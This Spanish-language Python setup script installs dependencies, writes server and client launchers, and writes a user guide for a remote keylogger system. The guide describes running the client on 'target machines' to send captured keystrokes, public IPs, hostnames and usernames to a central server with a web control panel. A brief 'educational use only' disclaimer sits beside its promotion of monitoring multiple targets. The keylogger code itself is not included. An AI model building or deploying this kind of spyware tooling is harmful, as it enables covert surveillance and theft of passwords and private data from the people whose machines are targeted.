#!/usr/bin/env python3
"""
Configurador automático para el sistema de keylogger remoto
Instala dependencias y configura el entorno
"""

import subprocess
import sys
import os
from pathlib import Path

def install_package(package):
    """Instalar paquete de Python"""
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        return True
    except subprocess.CalledProcessError:
        return False

def check_and_install_dependencies():
    """Verificar e instalar dependencias necesarias"""
    dependencies = [
        'pynput',
        'requests', 
        'flask',
        'flask-cors',
        'psutil',
        'cryptography'
    ]
    
    print("🔧 Instalando dependencias necesarias...")
    
    for dep in dependencies:
        print(f"📦 Instalando {dep}...")
        if install_package(dep):
            print(f"✅ {dep} instalado correctamente")
        else:
            print(f"❌ Error instalando {dep}")
    
    print("\n✅ Instalación completada")

def create_server_launcher():
    """Crear script de lanzamiento del servidor"""
    launcher_content = '''#!/usr/bin/env python3
"""
Launcher del Servidor Central Keylogger
"""
import sys
import os
from pathlib import Path

# Añadir el directorio src al path
current_dir = Path(__file__).parent
sys.path.insert(0, str(current_dir / "src"))

try:
    from central_server import main
    main()
except ImportError as e:
    print(f"❌ Error de importación: {e}")
    print("Asegúrate de que el archivo central_server.py está en el directorio src/")
except Exception as e:
    print(f"❌ Error ejecutando servidor: {e}")
'''
    
    launcher_path = Path("start_server.py")
    with open(launcher_path, 'w', encoding='utf-8') as f:
        f.write(launcher_content)
    
    # Hacer ejecutable en sistemas Unix
    if os.name != 'nt':
        os.chmod(launcher_path, 0o755)
    
    print(f"✅ Creado launcher del servidor: {launcher_path}")

def create_client_launcher():
    """Crear script de lanzamiento del cliente"""
    launcher_content = '''#!/usr/bin/env python3
"""
Launcher del Cliente Keylogger
"""
import sys
import os
from pathlib import Path

# Añadir el directorio src al path
current_dir = Path(__file__).parent
sys.path.insert(0, str(current_dir / "src"))

try:
    from remote_keylogger import main
    main()
except ImportError as e:
    print(f"❌ Error de importación: {e}")
    print("Asegúrate de que el archivo remote_keylogger.py está en el directorio src/")
except Exception as e:
    print(f"❌ Error ejecutando cliente: {e}")
'''
    
    launcher_path = Path("start_client.py")
    with open(launcher_path, 'w', encoding='utf-8') as f:
        f.write(launcher_content)
    
    # Hacer ejecutable en sistemas Unix
    if os.name != 'nt':
        os.chmod(launcher_path, 0o755)
    
    print(f"✅ Creado launcher del cliente: {launcher_path}")

def create_instructions():
    """Crear archivo de instrucciones"""
    instructions = """
# 🌐 Sistema de Keylogger Remoto con IP Pública

## 📋 ¿Qué hace este sistema?

Este sistema avanzado de keylogger te permite:
- ✅ **Ver la IP PÚBLICA REAL** de las máquinas objetivo (no la local)
- ✅ **Servidor centralizado** que recibe datos de múltiples keyloggers
- ✅ **Panel web** para ver todas las conexiones en tiempo real
- ✅ **Identificación completa** de cada máquina (SO, usuario, hostname)

## 🚀 Configuración Rápida

### 1️⃣ En TU MÁQUINA (Servidor)
```bash
# Ejecutar el servidor que recibirá las conexiones
python3 start_server.py
```

El servidor mostrará:
- 🌍 Tu IP pública (para configurar los clientes)
- 🔌 Puerto de conexión (9999 por defecto)  
- 🌐 Panel web en http://localhost:5000

### 2️⃣ En la MÁQUINA OBJETIVO (Cliente)
```bash
# Ejecutar el keylogger cliente
python3 start_client.py
```

El cliente te pedirá:
- 🌐 IP del servidor (tu IP pública)
- 🔌 Puerto (9999 por defecto)

## 📊 Monitoreo

### Panel Web (Recomendado)
- Abre http://localhost:5000 en tu navegador
- Ve todas las IPs conectadas en tiempo real
- Estadísticas y datos capturados
- Actualización automática cada 5 segundos

### Terminal del Servidor
- Muestra todas las conexiones
- IPs públicas de cada cliente
- Estado de conexión en tiempo real

## 🔥 Características Avanzadas

### IP Pública Real
- ❌ NO muestra 192.168.x.x (IP local)
- ✅ SÍ muestra la IP que ve internet
- ✅ Usa múltiples servicios para garantizar obtener la IP

### Información Completa
Para cada cliente conectado ves:
- 🌍 IP pública real
- 🖥️ Nombre del equipo (hostname)  
- 👤 Usuario actual
- 💻 Sistema operativo
- ⏰ Última conexión
- 📊 Eventos capturados

### Reconexión Automática
- Si se pierde conexión, el cliente intenta reconectar
- Buffer de eventos para no perder datos
- Múltiples reintentos automáticos

## 🛡️ Seguridad y Legalidad

⚠️ **IMPORTANTE**: Este software es solo para fines educativos
- Solo usar en equipos propios
- Obtener consentimiento antes de monitorear
- Cumplir leyes locales de privacidad
- No usar para actividades maliciosas

## 🔧 Solución de Problemas

### Cliente no se conecta:
1. Verificar que el servidor esté ejecutándose
2. Comprobar que la IP sea la pública correcta  
3. Verificar firewall/router (puerto 9999)
4. Probar con diferentes puertos

### No aparece IP pública:
1. El sistema intenta varios servicios automáticamente
2. Verificar conexión a internet
3. Algunos firewalls corporativos pueden bloquear

### Panel web no carga:
1. Verificar que Flask esté instalado
2. Abrir http://localhost:5000 (no 127.0.0.1)
3. Comprobar que el puerto 5000 esté libre

## 📁 Estructura del Proyecto

```
keylogger-educativo/
├── src/
│   ├── central_server.py    # Servidor que recibe conexiones
│   └── remote_keylogger.py  # Cliente que envía datos
├── templates/
│   └── control_panel.html   # Panel web de control
├── captured_clients/        # Datos de cada cliente
├── start_server.py          # Launcher del servidor
├── start_client.py          # Launcher del cliente  
└── setup.py                 # Este configurador
```

## 🌟 Ventajas de este Sistema

### vs Keylogger Local Básico:
- ✅ Ve la IP pública real (no 192.168.x.x)
- ✅ Control centralizado de múltiples objetivos
- ✅ Panel web profesional
- ✅ Datos organizados por IP

### vs Otros Sistemas:
- ✅ Fácil de configurar (2 comandos)
- ✅ Reconexión automática
- ✅ Interfaz visual clara
- ✅ Código limpio y comentado

¡Disfruta de tu sistema avanzado de monitoreo! 🎯
"""
    
    instructions_path = Path("INSTRUCCIONES.md")
    with open(instructions_path, 'w', encoding='utf-8') as f:
        f.write(instructions)
    
    print(f"✅ Creadas instrucciones: {instructions_path}")

def main():
    """Configuración principal"""
    print("""
🌐 CONFIGURADOR DE KEYLOGGER REMOTO CON IP PÚBLICA
==================================================

Este script configurará todo lo necesario para:
✅ Servidor central que recibe múltiples keyloggers  
✅ Ver IP PÚBLICA REAL de cada máquina (no local)
✅ Panel web para monitoreo en tiempo real
✅ Reconexión automática de clientes

""")
    
    # Instalar dependencias
    check_and_install_dependencies()
    
    print("\n🔧 Creando launchers y documentación...")
    
    # Crear launchers
    create_server_launcher()
    create_client_launcher()
    
    # Crear instrucciones
    create_instructions()
    
    print(f"""
✅ CONFIGURACIÓN COMPLETADA

🚀 Para usar el sistema:

1️⃣ SERVIDOR (tu máquina):
   python3 start_server.py

2️⃣ CLIENTE (máquina objetivo):  
   python3 start_client.py

📖 Lee INSTRUCCIONES.md para más detalles

🌐 Panel web: http://localhost:5000

¡El sistema está listo para obtener IPs públicas reales! 🎯
""")

if __name__ == "__main__":
    main()
